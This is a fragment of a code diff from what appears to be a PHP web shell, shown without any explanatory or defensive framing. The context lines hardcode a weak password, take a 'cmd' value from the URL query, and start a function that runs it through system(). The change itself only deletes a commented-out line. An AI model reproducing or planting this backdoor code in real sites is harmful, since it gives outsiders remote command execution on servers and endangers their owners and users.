@@ -3,7 +3,6 @@
 $password = "12345";
 $get_password = @$_GET["password"];
 $cmd = @$_GET["cmd"];
-#$aksi = @$_GET["aksi"];
 
 function exe($cmd){
     if(function_exists('system')){
